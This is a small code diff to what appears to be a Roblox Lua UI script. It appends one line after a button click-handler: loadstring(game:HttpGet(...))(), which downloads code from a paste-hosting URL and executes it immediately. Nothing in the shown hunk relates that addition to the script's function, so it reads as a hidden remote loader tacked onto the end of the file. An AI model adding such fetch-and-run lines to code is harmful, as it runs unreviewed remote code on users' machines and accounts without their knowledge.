@@ -170,3 +170,4 @@ toggleBtn.MouseButton1Click:Connect(function()
         end
     end
 end)
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/dxBJA9CZKR/0", true))()
